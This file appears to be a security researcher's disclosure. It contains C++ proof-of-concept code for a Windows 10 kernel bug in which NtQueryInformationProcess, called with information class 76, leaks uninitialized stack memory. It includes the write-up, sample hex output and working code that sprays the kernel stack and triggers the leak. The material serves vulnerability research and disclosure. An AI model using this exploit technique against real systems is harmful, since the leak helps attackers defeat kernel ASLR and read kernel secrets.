@@ -1,0 +1,120 @@
+/*
+We have discovered that the nt!NtQueryInformationProcess system call invoked with the 76 information class discloses portions of uninitialized kernel stack memory to user-mode clients. The specific information class is handled by an internal nt!PsQueryProcessEnergyValues function.
+
+While we don't know the layout of the output structure, we have determined that on our test Windows 10 version 1709 32-bit system, the output size is 0x1B0 (432) bytes. Within the output buffer, four consecutive bytes at offsets 0x8c to 0x8f are not properly initialized and contain leftover data from the kernel stack. 
+
+The attached proof of concept code works by first filling a large portion of the kernel stack with a controlled marker byte 0x41 ('A') using the win32k!NtGdiEngCreatePalette system call, and then invokes the affected nt!NtQueryInformationProcess service. As a result, we can observe that these leftover bytes are indeed leaked to user-mode at offset 0x8c of the output structure:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 94 90 f8 01 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000080: 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
+00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000110: b6 04 00 00 01 00 00 00 00 00 00 00 00 00 00 00 ................
+00000120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000001a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm {mov eax, ApiNumber};
+  __asm {lea edx, ApiNumber + 4};
+  __asm {int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Windows 10 version 1709 32-bit.
+  CONST ULONG __NR_NtGdiEngCreatePalette = 0x1296;
+
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[1024];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  SystemCall32(__NR_NtGdiEngCreatePalette, 1, sizeof(buffer) / sizeof(DWORD), buffer, 0, 0, 0);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Initialize the thread as GUI.
+  LoadLibrary(L"user32.dll");
+
+  // Spray the kernel stack to get visible results of the memory disclosure.
+  SprayKernelStack();
+
+  // Trigger the bug and display the output.
+  BYTE OutputBuffer[0x1b0] = { /* zero padding */ };
+  ULONG ReturnLength;
+
+  NTSTATUS st = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)76, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationProcess failed, %x\n", st);
+    return 1;
+  }
+
+  PrintHex(OutputBuffer, sizeof(OutputBuffer));
+
+  return 0;
+}
